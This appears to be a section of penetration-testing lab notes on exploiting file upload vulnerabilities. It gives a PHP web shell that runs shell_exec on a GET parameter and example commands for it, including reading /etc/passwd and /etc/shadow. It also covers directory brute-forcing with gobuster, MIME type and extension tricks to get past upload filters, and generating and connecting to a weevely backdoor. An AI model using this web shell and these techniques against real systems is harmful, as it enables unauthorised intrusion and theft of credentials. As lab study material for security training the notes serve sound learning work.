## 7. FILE AND RESOURCE ATTACKS

### 7.1. Basic file upload vulnerabilities

- **Actions**:
  1. Upload the file and check the url with the folders → Go to gobuster
  2. Gobuster command → ```dir --url [url] (without path) --wordlist usr/share/wordlists/dirb/common.txt```
  3. Check if it allows directory listing by accessing the url
  4. Check file extensions in Burp Suite → add a php payload → save on desktop
    ```php
        $output = shell_exec($_GET["cmd"]);
        echo "<pre>$output</pre>";
    ```
  5. Upload the file
  6. Cmd will contain the command for the injection
    - Examples
        - ```id```
        - ```whoami```
        - ```ls /var/www/html```
        - ```cat /etc/passwd```
        - ```cat /etc/shadow```
        - ```cat /etc/*release```
  7. Reverse shells
    - Webshells: ```cd /usr/share/webshells/php``` 
    - Change IP in target folder

### 7.2. Bypassing file upload extension filters

1. Intercept POST upload with BS. Check body payload
2. Change content type to one allowed → MIME type, ```image/jpeg```
3. If not working → change the filename extension
4. Then execute the access get url but in the context of php → ```url/shell.jpg/shell.php?cmd=id```
5. Repeat steps from lab 1
5. Do it automatically
  - Generate payload → ```weevely generate password ~/Desktop/weevely.jpg```
  - Attack against the url → ```weevely url password```